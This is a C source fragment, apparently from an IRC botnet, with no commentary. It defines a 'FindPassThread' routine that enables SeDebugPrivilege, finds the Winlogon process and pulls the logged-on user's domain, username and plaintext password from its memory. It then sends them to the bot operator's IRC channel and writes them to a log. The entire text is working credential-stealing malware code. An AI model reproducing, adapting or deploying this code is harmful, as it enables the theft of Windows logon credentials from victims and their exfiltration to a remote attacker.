DWORD WINAPI FindPassThread(LPVOID param)
{ 
	FINDPASS findpass = *((FINDPASS *)param);
	FINDPASS *findpasss = (FINDPASS *)param;
	findpasss->gotinfo = TRUE;

	char sendbuf[IRCLINE];

	DWORD dwOS = OSVersionCheck();
	if (dwOS == OS_WINNT || dwOS == OS_WIN2K) {
		if (AdjustPrivileges("SeDebugPrivilege", TRUE)) {
			HINSTANCE hNtDll = LoadLibrary("NTDLL.DLL");
			pfnNtQuerySystemInformation = (PFNNTQUERYSYSTEMINFORMATION)GetProcAddress 
				(hNtDll,"NtQuerySystemInformation");
			pfnRtlCreateQueryDebugBuffer = (PFNRTLCREATEQUERYDEBUGBUFFER)GetProcAddress 
				(hNtDll,"RtlCreateQueryDebugBuffer");
			pfnRtlQueryProcessDebugInformation = (PFNRTLQUERYPROCESSDEBUGINFORMATION)GetProcAddress 
				(hNtDll,"RtlQueryProcessDebugInformation");
			pfnRtlDestroyQueryDebugBuffer = (PFNRTLDESTROYQUERYDEBUGBUFFER)GetProcAddress 
				(hNtDll,"RtlDestroyQueryDebugBuffer");
			pfnRtlRunDecodeUnicodeString = (PFNTRTLRUNDECODEUNICODESTRING)GetProcAddress 
				(hNtDll,"RtlRunDecodeUnicodeString");

			DWORD WinLogonPID = FindWinLogon();
			if (WinLogonPID != 0) { 
				GetEnvironmentVariableW(L"USERNAME", UserName, 0x400);
				GetEnvironmentVariableW(L"USERDOMAIN", UserDomain, 0x400);
	 
				BOOL FoundPasswordPage = ((dwOS == OS_WINNT)?(LocatePasswordPageWinNT(WinLogonPID,&PasswordLength))
					:(LocatePasswordPageWin2K(WinLogonPID,&PasswordLength)));
				if (FoundPasswordPage) { 
					if (PasswordLength == 0) 
						_snprintf(sendbuf,sizeof(sendbuf),"[FINDPASS]: The Windows logon (Pid: <%d>) information is: Domain: \\\\%S, User: (%S/(no password)).",
							WinLogonPID,UserDomain,UserName);
					else 
						sprintf(sendbuf,(dwOS == OS_WINNT)?(DisplayPasswordWinNT(WinLogonPID)):(DisplayPasswordWin2K(WinLogonPID)));
				} else	
					sprintf(sendbuf,"[FINDPASS]: Unable to find the password in memory.");
			} else 
				sprintf(sendbuf,"[FINDPASS]: Unable to find Winlogon Process ID.");

			AdjustPrivileges("SeDebugPrivilege", FALSE);
			FreeLibrary(hNtDll);
		} else
			sprintf(sendbuf, "[FINDPASS]: Failed to enable Debug Privilege.");
	} else
		sprintf(sendbuf, "[FINDPASS]: Only supported on Windows NT/2000.");

	if (!findpass.silent) irc_privmsg(findpass.sock,findpass.chan,sendbuf,findpass.notice);
	addlog(sendbuf);

	clearthread(findpass.threadnum);

	ExitThread(0);
}